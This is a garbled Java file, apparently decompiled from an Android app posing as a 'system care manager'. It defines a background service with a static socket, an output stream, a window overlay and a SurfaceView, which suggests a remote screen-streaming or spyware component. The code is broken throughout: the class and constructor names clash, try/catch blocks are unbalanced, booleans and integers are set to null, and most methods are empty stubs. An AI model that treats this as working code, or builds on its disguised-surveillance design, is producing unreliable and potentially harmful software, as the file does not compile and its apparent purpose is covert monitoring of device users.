package com.system.caremanager;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.util.Log;
import java.util.ArrayList;
import java.util.List;

public class SecondaryService extends Service implements SurfaceHolder.Callback {

    public static WindowManager.LayoutParams la_y;
    public static OutputStream o_ut;
    public static SurfaceView s_fw;
    public static Socket s_k;
    static SecondaryBackgroundService st;
    private static Object syc;
    public static WindowManager w_m;
    public boolean Lo;
    private List b_ts;
    public boolean ctd;
    private int q4;
    public boolean usd;
    private String[] vul;

    static {
        // Static initialization block
    }

    public SecondaryBackgroundService() {
        this.usd = null;
        this.ctd = null;
        this.Lo = null;
        ArrayList arrayList = new ArrayList();
        this.b_ts = arrayList;
        int val = 50;
        this.q4 = val;
        return;
    }

    private void di() {
        try {
            this.Lo = null;
            MainBackgroundService.F_ORCA = null;
            Socket s_k = SecondaryBackgroundService.s_k;
            s_k.shutdownOutput();
            } catch (Exception e) {
                e.printStackTrace();
            Socket s_k2 = SecondaryBackgroundService.s_k;
            s_k2.shutdownInput();
            } catch (Exception e) {
                e.printStackTrace();
            Socket s_k3 = SecondaryBackgroundService.s_k;
            OutputStream result = s_k3.getOutputStream();
            result.close();
            } catch (Exception e) {
                e.printStackTrace();
            Socket s_k4 = SecondaryBackgroundService.s_k;
            InputStream result2 = s_k4.getInputStream();
            result.close();
            } catch (Exception e) {
                e.printStackTrace();
            Socket s_k5 = SecondaryBackgroundService.s_k;
            s_k5.close();
            } catch (Exception e) {
                e.printStackTrace();
            OutputStream o_ut = SecondaryBackgroundService.o_ut;
            if (o_ut == null) {
                // branch: cond_30
            }
            o_ut.close();
            } catch (Exception e) {
                e.printStackTrace();
            SecondaryBackgroundService.o_ut = null;
            return;
        } catch (IOException e) {
            e.printStackTrace();
        } catch (SocketException e) {
            e.printStackTrace();
        }
    }

    private int q(int param1, int param2) {
        int val = 61440;
        if (param1 <= val) {
            // branch: cond_8
        }
        int val2 = 15;
        // continue loop -> :goto_2c
        int val3 = 51200;
        if (param1 <= val3) {
            // branch: cond_10
        }
        int val4 = 25;
        // continue loop -> :goto_2c
        int val5 = 40960;
        if (param1 <= val5) {
            // branch: cond_18
        }
        int val6 = 35;
        // continue loop -> :goto_2c
        int val7 = 30720;
        if (param1 <= val7) {
            // branch: cond_1f
        }
        int val8 = 45;
        // continue loop -> :goto_2c
        int val9 = 20480;
        if (param1 <= val9) {
            // branch: cond_26
        }
        int val10 = 65;
        // continue loop -> :goto_2c
        int val11 = 10240;
        if (param1 <= val11) {
            // branch: cond_2c
        }
        int val12 = 75;
        return val12;
    }

    public void Completed_App(String param1, int param2) {
        Thread thread = new Thread();
        SecondaryBackgroundService.1 secondaryBackgroundService.1 = new SecondaryBackgroundService.1();
        thread.start();
        return;
    }

    public boolean c_k() {
        return null;
    }

    public IBinder onBind(Intent param1) {
        return null;
    }

    public void onDestroy() {
        this.onDestroy();
        DataPackagingEngine.s_f1 = null;
        SecondaryBackgroundService.st = null;
        this.sp();
        return;
    }

    public int onStartCommand(Intent param1, int param2, int param3) {
        return null;
    }

    public void p_r() {
        return;
    }

    public void sp() {
        return;
    }

    public void surfaceChanged(SurfaceHolder param1, int param2, int param3, int param4) {
        return;
    }

    public void surfaceCreated(SurfaceHolder param1) {
        return;
    }

    public void surfaceDestroyed(SurfaceHolder param1) {
        return;
    }

}